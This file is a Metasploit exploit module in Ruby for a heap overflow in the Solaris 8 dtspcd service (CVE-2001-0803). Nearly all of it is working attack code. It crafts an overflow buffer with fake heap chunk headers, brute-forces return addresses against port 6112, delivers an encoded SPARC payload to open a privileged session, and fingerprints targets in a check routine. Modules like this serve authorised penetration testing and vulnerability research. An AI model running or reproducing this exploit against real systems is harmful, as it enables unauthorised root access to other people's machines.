##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Solaris dtspcd Heap Overflow',
        'Description' => %q{
          This is a port of noir's dtspcd exploit. This module should
          work against any vulnerable version of Solaris 8 (sparc).
          The original exploit code was published in the book
          Shellcoder's Handbook.
        },
        'Author' => [ 'noir <noir[at]uberhax0r.net>', 'hdm' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2001-0803'],
          ['OSVDB', '4503'],
          ['BID', '3517'],
          ['URL', 'https://web.archive.org/web/20011116020106/http://www.cert.org/advisories/CA-2001-31.html'],
          ['URL', 'https://media.wiley.com/product_ancillary/83/07645446/DOWNLOAD/Source_Files.zip'],

        ],
        'Privileged' => true,
        'Payload' => {
          'Space' => 800,
          'BadChars' => "\x00\x0d",
          'PrependEncoder' => ("\xa4\x1c\x40\x11" * 3)
        },
        'Platform' => 'solaris',
        'Arch' => ARCH_SPARC,
        'Targets' => [
          [
            'Solaris 8',
            {
              'Rets' => [
                0xff3b0000, 0x2c000, 0x2f000, 0x400, [ 0x321b4, 0x361d8, 0x361e0, 0x381e8 ]
              ]
            }
          ],
        ],
        'DisclosureDate' => '2002-07-10',
        'DefaultTarget' => 0,
        'Notes' => {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SERVICE_RESTARTS ]
        }
      )
    )

    register_options([
      Opt::RPORT(6112)
    ])
  end

  def exploit
    target['Rets'][4].each do |tjmp|
      rbase = target['Rets'][1]

      while (rbase < target['Rets'][2])
        break if session_created?

        retloc = target['Rets'][0] + tjmp
        print_status(format('Trying 0x%<retloc>.8x 0x%<rbase>.8x...', retloc: retloc, rbase: rbase))

        begin
          attack(retloc, rbase, payload.encoded)
          break if session_created?

          attack(retloc, rbase + 4, payload.encoded)
          rbase += target['Rets'][3]
        rescue EOFError
          # This is expected
        end
      end
    end

    handler
    disconnect
  end

  def check
    spc_connect
    spc_write(spc_register('root', "\x00"), 4)
    host, os, ver, arch = spc_read.gsub("\x00", '').split(':')

    return CheckCode::Safe unless host

    spc_write('', 2)

    return CheckCode::Safe("Detected dtspcd running #{os} v#{ver} on #{arch} hardware. Target host architecture #{arch} is not sparc.") unless arch =~ /sparc/i

    CheckCode::Detected("Detected dtspcd running #{os} v#{ver} on #{arch} hardware.")
  end

  def chunk_create(retloc, retadd)
    "\x12\x12\x12\x12" +
      [retadd].pack('N') +
      "\x23\x23\x23\x23\xff\xff\xff\xff" \
      "\x34\x34\x34\x34\x45\x45\x45\x45" \
      "\x56\x56\x56\x56" +
      [retloc - 8].pack('N')
  end

  def attack(retloc, retadd, fcode)
    spc_connect

    buf = ("\xa4\x1c\x40\x11\x20\xbf\xff\xff" * ((4096 - 8 - fcode.length) / 8))
    buf << fcode
    buf << "\x00\x00\x10\x3e\x00\x00\x00\x14"
    buf << "\x12\x12\x12\x12\xff\xff\xff\xff"
    buf << "\x00\x00\x0f\xf4"
    buf << chunk_create(retloc, retadd)
    buf << 'X' * ((0x103e - 8) - buf.length)

    spc_write(spc_register('', buf), 4)

    handler
  rescue EOFError
    # This is expected
  end

  def spc_register(user = '', buff = '')
    "4 \x00#{user}\x00\x0010\x00#{buff}"
  end

  def spc_write(buff = '', cmd = '')
    data = format('%08x', 2)
    data << format('%02x', cmd)
    data << format('%04x', buff.length)
    data << format('%04x', (@spc_seq += 1))
    data << "  #{buff}"
    sock.put(data)
  end

  def spc_read
    # Bytes: 0-9 = channel, 9-10 = cmd, 10-13 = mbl, 14-17 = seq
    head = sock.get_once(20)
    sock.get_once(head[10, 13].hex) || ''
  end

  def spc_connect
    disconnect
    connect
    @spc_seq = 0
  end
end
